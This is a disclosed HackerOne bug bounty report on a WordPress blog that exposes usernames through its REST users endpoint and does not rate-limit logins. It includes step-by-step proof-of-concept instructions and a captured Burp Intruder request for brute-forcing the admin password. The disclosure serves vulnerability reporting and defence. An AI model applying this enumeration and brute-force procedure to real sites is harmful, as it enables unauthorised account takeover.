---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1403302'
original_report_id: '1403302'
title: blog/wp-json/wp/v2/users FILE is enable it will used for bruteforce attack
  the admin panel at   blog/wp-login.php
weakness: Improper Restriction of Authentication Attempts
team_handle: mailru
created_at: '2021-11-17T20:24:54.433Z'
disclosed_at: '2022-01-09T18:28:36.753Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 43
asset_identifier: Uchi
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- improper-restriction-of-authentication-attempts
---

# blog/wp-json/wp/v2/users FILE is enable it will used for bruteforce attack the admin panel at   blog/wp-login.php

## Metadata

- HackerOne Report ID: 1403302
- Weakness: Improper Restriction of Authentication Attempts
- Program: mailru
- Disclosed At: 2022-01-09T18:28:36.753Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hello team,

The file v2/users at https://happynumbers.com/blog/wp-json/wp/v2/users/ is enabled and this give the attacker many users names like ```admin``` ```adam``` ```Alexa``` ```Alina``` ```Danny``` ```David``` ```Fedor``` ```Olga```  to use them at https://happynumbers.com/blog/wp-login.php on BRUTE FORCE attack ( because no protection against this attack)

##POC:

1- Go to https://happynumbers.com/blog/wp-json/wp/v2/users/ 
2- pic the ```admin``` username or any other name
3- go to https://happynumbers.com/blog/wp-login.php and put the ```admin``` on username fields and put any password
4- intercept the request with burpsuite and send the request to Intruder and set the payload on ```pwd``` parameter and start the brute force attack , the request will be like that:
```
POST /blog/wp-login.php HTTP/2
Host: happynumbers.com
Cookie: wordpress_test_cookie=WP%20Cookie%20check; _happy-numbers_session=ZUFYZTNURnM2cGpWRXAzRUllaUFLQzl3a0I0YUpPaWFOSWxkaTd4NHJhRWJRZFRHOGQ5VmMwc3NnM2xjUWtoUVNsSElCeHVMdURJNnJ5ZStJZFlkUFpZeXNlWUhwR1dybXBpWnVBdmpTbXN6d1VqOW9FYlJ1Z2E3VlNxS3BVaUNON2VWQ3FreDA2Rk9ySVNEQ3IzWmJ4NUpTcFY5VE5xUllzUW1FcG03eTBxMXFzUnIvelFjd0dPMXJicDVvMlJTLS1wbVhUcGorOUxQQ0ZQWmZnMHpBQVVRPT0%3D--6ace53f5da4342db8c60454a98fa5f587d271556
Content-Length: 125
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://happynumbers.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://happynumbers.com/blog/wp-login.php?redirect_to=http%3A%2F%2Fhappynumbers-blog.herokuapp.com%2Fwp-admin%2F&reauth=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ar;q=0.8

log=admin&pwd=admina§d§min&wp-submit=Log+In&redirect_to=http%3A%2F%2Fhappynumbers-blog.herokuapp.com%2Fwp-admin%2F&testcookie=1
```
5- you still get this msg on the response ```The password you entered for the username admin is incorrect. ```
6- i tried more than 100 requests and im not get blocking 


##screen shoot attached

## Impact

Information Disclosure , may lead to login to the admin panel

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
